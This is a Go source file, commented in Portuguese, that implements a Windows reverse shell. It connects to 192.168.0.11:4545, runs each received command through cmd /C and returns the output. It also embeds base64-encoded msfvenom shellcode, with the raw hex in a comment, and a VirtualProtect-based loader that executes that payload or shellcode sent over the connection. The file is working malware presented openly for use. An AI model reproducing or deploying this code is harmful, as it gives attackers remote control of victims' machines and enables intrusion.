package main

import (
	"bufio"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

// aloca shellcode na memoria
//o viso de que (NewLazyDLL) Not Declared, vai acontecer se vc estiver usando linux
//pelo fato do linux nao possuir bibliotecas -> kernel32.dll
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

// funcao de alocacao
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func shellcode(codePelaRede string) {
	//shell code em hexadecimal, msfvenom, ip=192.168.0.11 port=6666
	//shell hex puro
	//codeShell := "fce88f0000006089e531d2648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01c74975ef528b52108b423c01d0578b407885c0744c01d08b48188b582001d35085c9743c31ff498b348b01d631c0c1cf0dac01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a68c0a8000b6802001a0a89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740aff4e0875ece8670000006a006a0456576802d9c85fffd583f8007e368b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007d285868004000006a0050680b2f0f30ffd55768756e4d61ffd55e5eff0c240f8570ffffffe99bffffff01c329c675c1c3bbf0b5a2566a0053ffd5"
	codeShell := "ZmNlODhmMDAwMDAwNjA4OWU1MzFkMjY0OGI1MjMwOGI1MjBjOGI1MjE0MGZiNzRhMjY4YjcyMjgzMWZmMzFjMGFjM2M2MTdjMDIyYzIwYzFjZjBkMDFjNzQ5NzVlZjUyOGI1MjEwOGI0MjNjMDFkMDU3OGI0MDc4ODVjMDc0NGMwMWQwOGI0ODE4OGI1ODIwMDFkMzUwODVjOTc0M2MzMWZmNDk4YjM0OGIwMWQ2MzFjMGMxY2YwZGFjMDFjNzM4ZTA3NWY0MDM3ZGY4M2I3ZDI0NzVlMDU4OGI1ODI0MDFkMzY2OGIwYzRiOGI1ODFjMDFkMzhiMDQ4YjAxZDA4OTQ0MjQyNDViNWI2MTU5NWE1MWZmZTA1ODVmNWE4YjEyZTk4MGZmZmZmZjVkNjgzMzMyMDAwMDY4Nzc3MzMyNWY1NDY4NGM3NzI2MDc4OWU4ZmZkMGI4OTAwMTAwMDAyOWM0NTQ1MDY4Mjk4MDZiMDBmZmQ1NmEwYTY4YzBhODAwMGI2ODAyMDAxYTBhODllNjUwNTA1MDUwNDA1MDQwNTA2OGVhMGZkZmUwZmZkNTk3NmExMDU2NTc2ODk5YTU3NDYxZmZkNTg1YzA3NDBhZmY0ZTA4NzVlY2U4NjcwMDAwMDA2YTAwNmEwNDU2NTc2ODAyZDljODVmZmZkNTgzZjgwMDdlMzY4YjM2NmE0MDY4MDAxMDAwMDA1NjZhMDA2ODU4YTQ1M2U1ZmZkNTkzNTM2YTAwNTY1MzU3NjgwMmQ5Yzg1ZmZmZDU4M2Y4MDA3ZDI4NTg2ODAwNDAwMDAwNmEwMDUwNjgwYjJmMGYzMGZmZDU1NzY4NzU2ZTRkNjFmZmQ1NWU1ZWZmMGMyNDBmODU3MGZmZmZmZmU5OWJmZmZmZmYwMWMzMjljNjc1YzFjM2JiZjBiNWEyNTY2YTAwNTNmZmQ1Cg=="

	var sc []byte
	var err error
	if len(codePelaRede) > 100 {
		codeRedeDescript := decriptar(codePelaRede)
		sc, err = hex.DecodeString(codeRedeDescript)
	} else {
		codeRedeDescript2 := decriptar(codeShell)
		sc, err = hex.DecodeString(codeRedeDescript2)
	}

	if err != nil {
		fmt.Println(err)
	}

	f := func() {}

	var oldfperms uint32
	if !VirtualProtect(
		unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), // O ponteiro para nossa função f () (lpAddress)
		unsafe.Sizeof(uintptr(0)),                        // O tamanho dos atributos de proteção de acesso a serem alterados (dwSize)
		uint32(0x40),                                     // Nossa nova permissão de acesso à memória 0x40 FULL ACCESS
		unsafe.Pointer(&oldfperms)) {                     // Armazene nossas permissões antigas na var do oldfperms
		panic("Call to VirtualProtect failed!")
	}

	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}

	f()
}

//fim da alocacao de shellcode na memoria

func decriptar(dados string) string {
	//sEnc := b64.StdEncoding.EncodeToString([]byte(dados))
	//fmt.Println(sEnc)

	sDec, _ := b64.StdEncoding.DecodeString(dados)
	//converter para string para visualizar em texto legivel
	return string(sDec)
}

// shelreverse simples
func shelReverse() {
	conn, _ := net.Dial("tcp", "192.168.0.11:4545")
	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command("cmd", "/C", message).Output()
		if len(message) > 100 {
			//Recebdo shell code pela rede
			fmt.Fprintf(conn, "%s\n", "Shell Code Metasploit Enviado Pela Rede Iniciado...\nOlhe seu Mult Handler\n")
			shellcode(message)
		}
		// retirar o \n da string
		//message = message[:len(message)-1]
		if message == "init-msf\n" {
			println("Iniciar shell-Code...")
			fmt.Fprintf(conn, "%s\n", "Shell Code Metasploit Iniciado...\nOlhe seu Mult Handler\n")
			shellcode(message)
		}

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)

	}
}
func main() {
	shelReverse()
}
